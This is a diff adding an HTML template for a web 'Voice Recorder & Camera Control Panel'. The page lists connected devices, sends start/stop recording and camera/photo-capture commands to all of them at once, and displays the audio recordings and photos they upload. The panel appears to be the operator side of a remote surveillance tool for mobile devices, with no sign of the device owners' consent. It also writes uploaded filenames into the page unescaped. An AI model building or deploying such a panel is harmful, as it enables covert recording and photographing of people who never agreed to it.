@@ -1,0 +1,510 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Voice Recorder & Camera Control Panel</title>
+    <style>
+        body { 
+            font-family: Arial, sans-serif; 
+            padding: 20px; 
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            margin: 0;
+            min-height: 100vh;
+        }
+        .container { 
+            max-width: 1100px; 
+            margin: 0 auto; 
+            background: white; 
+            padding: 30px; 
+            border-radius: 15px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+        }
+        .btn { 
+            padding: 12px 24px; 
+            margin: 10px; 
+            border: none; 
+            border-radius: 8px; 
+            cursor: pointer; 
+            font-size: 16px;
+            transition: all 0.3s ease;
+        }
+        .start-btn { 
+            background: #4CAF50; 
+            color: white; 
+        }
+        .start-btn:hover {
+            background: #45a049;
+            transform: translateY(-2px);
+        }
+        .stop-btn { 
+            background: #f44336; 
+            color: white; 
+        }
+        .stop-btn:hover {
+            background: #da190b;
+            transform: translateY(-2px);
+        }
+        .camera-btn {
+            background: #2196F3;
+            color: white;
+        }
+        .camera-btn:hover {
+            background: #1976D2;
+            transform: translateY(-2px);
+        }
+        .device { 
+            background: #f8f9fa; 
+            padding: 20px; 
+            margin: 15px 0; 
+            border-radius: 10px;
+            border-left: 4px solid #667eea;
+        }
+        h1, h2, h3 {
+            color: #333;
+            margin-bottom: 20px;
+        }
+        h1 {
+            text-align: center;
+        }
+        .status-box {
+            background: #e7f3ff;
+            padding: 15px;
+            border-radius: 8px;
+            margin: 15px 0;
+            border: 1px solid #b3d9ff;
+        }
+        .data-section {
+            background: #fff3cd;
+            padding: 20px;
+            border-radius: 10px;
+            margin: 20px 0;
+            border-left: 4px solid #ffc107;
+        }
+        .camera-section {
+            background: #e8f5e8;
+            padding: 20px;
+            border-radius: 10px;
+            margin: 20px 0;
+            border-left: 4px solid #4CAF50;
+        }
+        .file-item {
+            background: white;
+            padding: 15px;
+            margin: 10px 0;
+            border-radius: 8px;
+            border: 1px solid #ddd;
+        }
+        .audio-player {
+            width: 100%;
+            margin: 10px 0;
+            height: 40px;
+        }
+        .tab {
+            overflow: hidden;
+            border: 1px solid #ccc;
+            background-color: #f1f1f1;
+            border-radius: 8px 8px 0 0;
+        }
+        .tab button {
+            background-color: inherit;
+            float: left;
+            border: none;
+            outline: none;
+            cursor: pointer;
+            padding: 14px 16px;
+            transition: 0.3s;
+            font-size: 16px;
+        }
+        .tab button:hover {
+            background-color: #ddd;
+        }
+        .tab button.active {
+            background-color: #667eea;
+            color: white;
+        }
+        .tabcontent {
+            display: none;
+            padding: 20px;
+            border: 1px solid #ccc;
+            border-top: none;
+            border-radius: 0 0 8px 8px;
+        }
+        .file-info {
+            background: #f8f9fa;
+            padding: 10px;
+            border-radius: 5px;
+            margin: 5px 0;
+        }
+        .camera-controls {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 10px;
+            justify-content: center;
+        }
+        .camera-preview {
+            text-align: center;
+            margin: 20px 0;
+            padding: 20px;
+            background: #f8f9fa;
+            border-radius: 10px;
+        }
+        .photo-item {
+            background: white;
+            padding: 15px;
+            margin: 10px 0;
+            border-radius: 8px;
+            border: 1px solid #ddd;
+            text-align: center;
+        }
+        .photo-item img {
+            max-width: 300px;
+            border-radius: 8px;
+            margin: 10px 0;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🎤 Voice Recorder & 📷 Camera Control Panel</h1>
+        
+        <div class="tab">
+            <button class="tablinks active" onclick="openTab(event, 'Control')">🎮 Control Panel</button>
+            <button class="tablinks" onclick="openTab(event, 'Camera')">📷 Camera Control</button>
+            <button class="tablinks" onclick="openTab(event, 'Data')">📊 Uploaded Files</button>
+            <button class="tablinks" onclick="openTab(event, 'Photos')">🖼️ Uploaded Photos</button>
+        </div>
+
+        <div id="Control" class="tabcontent" style="display: block;">
+            <div class="device">
+                <h3>📱 Connected Devices:</h3>
+                <div id="devicesList" style="min-height: 50px; padding: 10px; background: white; border-radius: 5px;">
+                    <div style="color: #666; text-align: center;">No devices connected</div>
+                </div>
+            </div>
+
+            <div class="device">
+                <h3>🚀 Send Command to All Devices:</h3>
+                <button class="btn start-btn" onclick="sendCommand('start_recording')">
+                    ▶️ Start Recording
+                </button>
+                <button class="btn stop-btn" onclick="sendCommand('stop_recording')">
+                    ⏹️ Stop Recording
+                </button>
+            </div>
+
+            <div class="status-box">
+                <h3>📊 Command Status:</h3>
+                <div id="status" style="padding: 10px; background: white; border-radius: 5px; min-height: 20px;">
+                    Ready to send commands...
+                </div>
+            </div>
+        </div>
+
+        <div id="Camera" class="tabcontent">
+            <div class="camera-section">
+                <h3>📷 Camera Control</h3>
+                <p>Control device camera remotely:</p>
+                
+                <div class="camera-controls">
+                    <button class="btn camera-btn" onclick="sendCameraCommand('front_camera')">
+                        📱 Front Camera
+                    </button>
+                    <button class="btn camera-btn" onclick="sendCameraCommand('back_camera')">
+                        📷 Back Camera
+                    </button>
+                    <button class="btn camera-btn" onclick="sendCameraCommand('capture_photo')">
+                        📸 Capture Photo
+                    </button>
+                    <button class="btn stop-btn" onclick="sendCameraCommand('stop_camera')">
+                        ⏹️ Stop Camera
+                    </button>
+                </div>
+
+                <div class="camera-preview">
+                    <h4>🖼️ Camera Preview</h4>
+                    <div id="cameraStatus" style="padding: 15px; background: white; border-radius: 5px; min-height: 50px;">
+                        Camera not active
+                    </div>
+                    <div id="photoPreview" style="margin-top: 15px;"></div>
+                </div>
+            </div>
+        </div>
+
+        <div id="Data" class="tabcontent">
+            <div class="data-section">
+                <h3>🎵 Uploaded Recordings</h3>
+                <div style="margin-bottom: 15px;">
+                    <button class="btn" style="background: #667eea; color: white;" onclick="refreshFiles()">
+                        🔄 Refresh Files
+                    </button>
+                    <span id="filesCount" style="margin-left: 10px; font-weight: bold;">0 files</span>
+                </div>
+                <div id="filesList" style="min-height: 100px;">
+                    <div style="color: #666; text-align: center; padding: 20px;">
+                        No recordings uploaded yet
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div id="Photos" class="tabcontent">
+            <div class="data-section">
+                <h3>🖼️ Uploaded Photos</h3>
+                <div style="margin-bottom: 15px;">
+                    <button class="btn" style="background: #667eea; color: white;" onclick="refreshPhotos()">
+                        🔄 Refresh Photos
+                    </button>
+                    <span id="photosCount" style="margin-left: 10px; font-weight: bold;">0 photos</span>
+                </div>
+                <div id="photosList" style="min-height: 100px;">
+                    <div style="color: #666; text-align: center; padding: 20px;">
+                        No photos uploaded yet
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div style="margin-top: 20px; text-align: center; color: #666; font-size: 12px;">
+            Server Time: <span id="serverTime">{{ current_time }}</span> | 
+            Server: {{ server_ip }}:5000
+        </div>
+    </div>
+
+    <script>
+        function openTab(evt, tabName) {
+            var i, tabcontent, tablinks;
+            tabcontent = document.getElementsByClassName("tabcontent");
+            for (i = 0; i < tabcontent.length; i++) {
+                tabcontent[i].style.display = "none";
+            }
+            tablinks = document.getElementsByClassName("tablinks");
+            for (i = 0; i < tablinks.length; i++) {
+                tablinks[i].className = tablinks[i].className.replace(" active", "");
+            }
+            document.getElementById(tabName).style.display = "block";
+            evt.currentTarget.className += " active";
+        }
+
+        function sendCommand(command) {
+            document.getElementById('status').innerHTML = '⏳ Sending command: ' + command + '...';
+            
+            fetch('/send_command', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ command: command })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.status === 'command_sent') {
+                    document.getElementById('status').innerHTML = 
+                        '✅ Command sent: ' + command + ' | Devices: ' + data.devices_count;
+                } else {
+                    document.getElementById('status').innerHTML = 
+                        '❌ Error: ' + (data.message || 'Unknown error');
+                }
+            })
+            .catch(error => {
+                document.getElementById('status').innerHTML = '❌ Network error: ' + error;
+            });
+        }
+
+        function sendCameraCommand(command) {
+            document.getElementById('cameraStatus').innerHTML = '⏳ Sending camera command: ' + command + '...';
+            
+            fetch('/camera', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ 
+                    command: command,
+                    action: 'control'
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.status === 'success') {
+                    document.getElementById('cameraStatus').innerHTML = 
+                        '✅ Camera command sent: ' + command;
+                    
+                    if (command === 'capture_photo' && data.photo_url) {
+                        document.getElementById('photoPreview').innerHTML = 
+                            '<img src="' + data.photo_url + '" style="max-width: 300px; border-radius: 10px; margin-top: 10px;">';
+                    }
+                } else {
+                    document.getElementById('cameraStatus').innerHTML = 
+                        '❌ Error: ' + (data.message || 'Unknown error');
+                }
+            })
+            .catch(error => {
+                document.getElementById('cameraStatus').innerHTML = '❌ Network error: ' + error;
+            });
+        }
+
+        function refreshDevices() {
+            fetch('/get_devices')
+                .then(response => response.json())
+                .then(data => {
+                    let devicesHtml = '';
+                    if (data.devices && Object.keys(data.devices).length > 0) {
+                        for (let device_id in data.devices) {
+                            const device = data.devices[device_id];
+                            const status = device.recording ? '🔴 RECORDING' : '🟢 IDLE';
+                            const lastSeen = new Date(device.last_seen * 1000).toLocaleTimeString();
+                            devicesHtml += `
+                                <div style="margin: 10px 0; padding: 10px; background: #f8f9fa; border-radius: 5px;">
+                                    <strong>Device:</strong> ${device_id.substring(0, 8)}...<br>
+                                    <strong>Status:</strong> ${status}<br>
+                                    <strong>Last Seen:</strong> ${lastSeen}
+                                </div>`;
+                        }
+                    } else {
+                        devicesHtml = '<div style="color: #666; text-align: center;">No devices connected</div>';
+                    }
+                    document.getElementById('devicesList').innerHTML = devicesHtml;
+                })
+                .catch(error => {
+                    document.getElementById('devicesList').innerHTML = 'Error loading devices';
+                });
+        }
+
+        function refreshFiles() {
+            fetch('/get_files')
+                .then(response => response.json())
+                .then(data => {
+                    let filesHtml = '';
+                    const audioFiles = data.files.filter(file => file.type !== 'photo');
+                    if (audioFiles.length > 0) {
+                        document.getElementById('filesCount').textContent = audioFiles.length + ' files';
+                        audioFiles.forEach(file => {
+                            const fileUrl = '/file/' + file.filename;
+                            const fileSizeKB = (file.size / 1024).toFixed(2);
+                            const uploadDate = new Date(file.upload_time * 1000).toLocaleString();
+                            
+                            filesHtml += `
+                                <div class="file-item">
+                                    <div class="file-info">
+                                        <strong>📁 File:</strong> ${file.filename}<br>
+                                        <strong>📱 Device:</strong> ${file.device_id.substring(0, 8)}...<br>
+                                        <strong>📅 Uploaded:</strong> ${uploadDate}<br>
+                                        <strong>📊 Size:</strong> ${fileSizeKB} KB
+                                    </div>
+                                    <audio controls class="audio-player" preload="metadata">
+                                        <source src="${fileUrl}" type="audio/3gpp">
+                                        <source src="${fileUrl}" type="audio/mpeg">
+                                        Your browser does not support the audio element.
+                                    </audio>
+                                    <div style="margin-top: 10px;">
+                                        <button class="btn" style="background: #667eea; color: white; padding: 8px 15px;" 
+                                                onclick="downloadFile('${file.filename}')">
+                                            📥 Download
+                                        </button>
+                                        <button class="btn" style="background: #28a745; color: white; padding: 8px 15px;" 
+                                                onclick="playFile('${file.filename}')">
+                                            ▶️ Play
+                                        </button>
+                                    </div>
+                                </div>`;
+                        });
+                    } else {
+                        filesHtml = '<div style="color: #666; text-align: center; padding: 20px;">No recordings uploaded yet</div>';
+                        document.getElementById('filesCount').textContent = '0 files';
+                    }
+                    document.getElementById('filesList').innerHTML = filesHtml;
+                })
+                .catch(error => {
+                    document.getElementById('filesList').innerHTML = 'Error loading files';
+                });
+        }
+
+        function refreshPhotos() {
+            fetch('/get_files')
+                .then(response => response.json())
+                .then(data => {
+                    let photosHtml = '';
+                    const photoFiles = data.files.filter(file => file.type === 'photo');
+                    if (photoFiles.length > 0) {
+                        document.getElementById('photosCount').textContent = photoFiles.length + ' photos';
+                        photoFiles.forEach(file => {
+                            const fileUrl = '/file/' + file.filename;
+                            const fileSizeKB = (file.size / 1024).toFixed(2);
+                            const uploadDate = new Date(file.upload_time * 1000).toLocaleString();
+                            
+                            photosHtml += `
+                                <div class="photo-item">
+                                    <div class="file-info">
+                                        <strong>📷 Photo:</strong> ${file.filename}<br>
+                                        <strong>📱 Device:</strong> ${file.device_id.substring(0, 8)}...<br>
+                                        <strong>📅 Uploaded:</strong> ${uploadDate}<br>
+                                        <strong>📊 Size:</strong> ${fileSizeKB} KB
+                                    </div>
+                                    <img src="${fileUrl}" alt="${file.filename}" onerror="this.style.display='none'">
+                                    <div style="margin-top: 10px;">
+                                        <button class="btn" style="background: #667eea; color: white; padding: 8px 15px;" 
+                                                onclick="downloadFile('${file.filename}')">
+                                            📥 Download
+                                        </button>
+                                        <button class="btn" style="background: #dc3545; color: white; padding: 8px 15px;" 
+                                                onclick="deleteFile('${file.filename}')">
+                                            🗑️ Delete
+                                        </button>
+                                    </div>
+                                </div>`;
+                        });
+                    } else {
+                        photosHtml = '<div style="color: #666; text-align: center; padding: 20px;">No photos uploaded yet</div>';
+                        document.getElementById('photosCount').textContent = '0 photos';
+                    }
+                    document.getElementById('photosList').innerHTML = photosHtml;
+                })
+                .catch(error => {
+                    document.getElementById('photosList').innerHTML = 'Error loading photos';
+                });
+        }
+
+        function downloadFile(filename) {
+            window.open('/file/' + filename, '_blank');
+        }
+
+        function playFile(filename) {
+            const audioElement = document.querySelector(`audio[src="/file/${filename}"]`);
+            if (audioElement) {
+                audioElement.play().catch(e => {
+                    console.error('Play error:', e);
+                });
+            }
+        }
+
+        function deleteFile(filename) {
+            if (confirm('Are you sure you want to delete ' + filename + '?')) {
+                fetch('/delete_file/' + filename, { method: 'DELETE' })
+                    .then(response => response.json())
+                    .then(data => {
+                        if (data.status === 'success') {
+                            refreshPhotos();
+                            refreshFiles();
+                        } else {
+                            alert('Delete failed: ' + data.message);
+                        }
+                    })
+                    .catch(error => {
+                        alert('Delete error: ' + error);
+                    });
+            }
+        }
+
+        function updateTime() {
+            document.getElementById('serverTime').textContent = new Date().toLocaleString();
+        }
+
+        // Auto refresh
+        setInterval(refreshDevices, 2000);
+        setInterval(refreshFiles, 5000);
+        setInterval(refreshPhotos, 5000);
+        setInterval(updateTime, 1000);
+        
+        // Initial load
+        refreshDevices();
+        refreshFiles();
+        refreshPhotos();
+        updateTime();
+    </script>
+</body>
+</html>
